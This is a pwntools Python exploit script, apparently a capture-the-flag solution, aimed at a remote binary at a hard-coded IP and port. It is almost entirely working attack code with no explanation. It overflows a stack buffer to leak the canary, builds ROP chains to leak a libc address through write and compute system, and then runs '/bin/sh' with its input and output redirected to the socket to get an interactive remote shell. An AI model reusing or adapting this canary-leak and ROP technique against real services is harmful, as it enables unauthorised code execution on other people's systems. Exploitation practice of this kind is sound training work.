from pwn import *

def set_trigger():
	r.sendlineafter("exterminator? ", "y")
	for i in range(2):
		r.sendlineafter("choice) :", "6")
	r.sendlineafter("choice) :", "5")
	r.sendlineafter("choice) :", "4")
	r.sendlineafter("choice) :", "3")
	for i in range(3):
		r.sendlineafter("choice) :", "2")
	for i in range(3):
		r.sendlineafter("choice) :", "1")
	r.sendlineafter("choice) :", "6")

r = remote("1.224.175.52", 30003)

set_trigger()
r.sendlineafter("Chance : ", 'A' * 0xc7)
r.recvuntil("A\n")
canary = u64(r.recv(8))
log.info("canary : " + hex(canary))
r.close()

r = remote("1.224.175.52", 30003)
set_trigger()
payload = "A" * 0xc8
payload += p64(canary)
payload += "B" * 8
payload += p64(0x00000000004015b3)	# pop rdi
payload += p64(4)
payload += p64(0x000000000040153d)	# pop rdx
payload += p64(8)
payload += p64(0x00000000004015b1)	# pop rsi r15
payload += p64(0x0000000000602F90)	# __libc_start_main got
payload += "AAAAAAAA"
payload += p64(0x00000000004009F0)	# write
r.sendlineafter("Chance : ", payload)
r.recvuntil(p64(canary))
libc_base = u64(r.recv(8)) - 0x20740
system = libc_base + 0x45390
log.info("libc_base : " + hex(libc_base))
r.close()

r = remote("1.224.175.52", 30003)
set_trigger()
payload = "A" * 0xc8
payload += p64(canary)
payload += "AAAAAAAA"
payload += p64(0x00000000004015b3)	# pop rdi
payload += p64(4)
payload += p64(0x000000000040153d)	# pop rdx
payload += p64(24)
payload += p64(0x00000000004015b1)	# pop rsi r15
payload += p64(0x0000000000603010)	# .bss
payload += "AAAAAAAA"
payload += p64(0x0000000000400A28)	# read
payload += p64(0x00000000004015b3)	# pop rdi
payload += p64(0x0000000000603010)	# .bss
payload += p64(system)				# system
payload += "AAAAAAAA"

r.sendlineafter("Chance : ", payload)
r.sendlineafter(p64(canary), "/bin/sh 0<&4 1>&4 2>&4;")

r.interactive()

